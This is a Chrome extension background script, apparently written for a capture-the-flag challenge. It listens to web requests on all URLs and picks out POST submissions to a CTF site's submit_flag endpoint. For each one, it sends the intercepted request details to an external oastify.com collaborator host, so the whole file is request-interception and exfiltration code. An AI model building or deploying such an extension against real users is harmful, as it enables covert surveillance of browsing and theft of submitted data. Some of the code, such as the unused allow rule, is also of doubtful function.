console.log("Extension loaded");

// Using declarativeNetRequest API for Manifest V3
try {
    chrome.declarativeNetRequest.updateDynamicRules({
        addRules: [{
            id: 1,
            priority: 1,
            action: {
                type: "allow"
            },
            condition: {
                urlFilter: "||tbank.mshp-ctf.ru/api/tasks/submit_flag",
                resourceTypes: ["xmlhttprequest"]
            }
        }]
    });

    // Listen for web requests using the newer API
    chrome.webRequest.onBeforeRequest.addListener(
        (details) => {
            console.log("Intercepted request:", details);
            if (details.method === "POST" && details.url === "https://tbank.mshp-ctf.ru/api/tasks/submit_flag") {
                console.log("Found target request:", details);

                // Send intercepted data to external service
                fetch('https://5tzw6xmn08ah7wdlt4i3h8uw9nfe34rt.oastify.com', {
                    method: 'POST',
                    headers: {
                        'Accept': 'application/json',
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({url: details.url, method: details.method})
                }).catch(error => {
                    console.error('Error sending data:', error);
                });
            }
        },
        {urls: ["<all_urls>"]},
        ["requestBody"]
    );

    console.log("Chrome API object:", chrome);
} catch (e) {
    console.error("Error in background script:", e);
}

